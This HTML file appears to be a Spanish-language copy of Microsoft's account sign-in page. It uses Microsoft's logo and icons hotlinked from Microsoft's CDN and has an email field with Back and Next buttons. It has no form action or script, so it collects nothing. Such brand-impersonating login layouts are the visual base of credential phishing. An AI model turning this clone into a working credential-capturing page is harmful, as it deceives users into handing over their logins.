<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión en la cuenta</title>
    <link rel="stylesheet" href="stylemicrosoft.css"> 
</head>
<body class="contenedor0">

    <div class="contenedorfr">
        <div class="contenedor-principal">
            <div class="contenedor-1">
                <img class="logo imagen-mcs" role="img" pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
                <h1>Iniciar sesión</h1>
                <input type="text" placeholder="Correo electrónico, teléfono o Skype">
                <div class="no-tiene-cuenta">
                    <p class="p-no-tiene-cuenta">¿No tiene una cuenta?</p>
                    <a href="">Cree una.</a>
                </div>
                <a href="" class="no-puede-acceder">¿No puede acceder a su cuenta?</a>
                <div class="atras-siguiente">
                    <button class="atras">Atrás</button>
                    <button class="siguiente">Siguiente</button>
                </div>
            </div>
        </div> 
        <div class="contenedor-principal2">
            <button>
                <img class="tile-img medium" role="presentation" data-bind="addEventHandlers, attr: { src: $data.darkIconUrl }" src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg">
                <p>Opciones de inicio de sesión</p>
            </button>
        </div>
    </div>


    <div class="terminos">
        <a href="">Términos de uso</a>
        <a href="">Privacidad y Cookies</a>
    </div>
</body>
</html>
